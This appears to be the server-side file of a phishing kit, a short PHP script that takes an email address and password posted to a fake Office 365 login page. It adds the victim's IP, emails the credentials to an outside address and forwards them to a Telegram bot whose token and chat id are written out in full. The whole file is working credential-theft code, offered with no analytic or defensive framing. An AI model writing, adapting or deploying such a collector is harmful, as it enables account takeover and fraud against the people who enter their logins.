<?php

$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_POST['hsdgaksjd_hdfsv']) && isset($_POST['hgdfjahsgd_jasdj']))
{
        $message = "\n";
   $message .= "ðŸ¥¨ðŸ¥¨< ------ OFFICE  EMAIL by @sharpbladez ------ > ðŸ¥¨ðŸ¥¨\n";
    $message .= "ðŸ¥¨ðŸ¥¨< ------ Step EMAIL Login ------ > ðŸ¥¨ðŸ¥¨\n";
    $message .= "\n";

    $message .= "\n";
    $message .= "\n";
    $message .= "ðŸ¤µ ðŸ‘¤ Emaill :  ".$_POST["hsdgaksjd_hdfsv"]."\n";
    $message .= "ðŸ«‚ ðŸ«‚ Password :  ".$_POST["hgdfjahsgd_jasdj"]."\n";
    $message .= "\n";
    
    
    $message .= "ðŸ«‚ ðŸ«‚ IP :  ".$ip."\n";
    $message .= "\n";
    $message .= "< ------ User Info------ > \n";

    $message .= "\n";
    $message .= "< ------  ------ > \n";
    $message .= "\n";
    
   $send = "mop303@goatmail.uk";
        $subject = " office365 Login $ip :";
        mail($send, $subject, $message);
		
		
		 $url = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage?chat_id=6926935950";
        $url = $url . "&text=" . urlencode($message);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);

    echo json_encode(['ok' => 'ok']);
}else{
    echo json_encode(['bad' => 'bad']);
}

?>
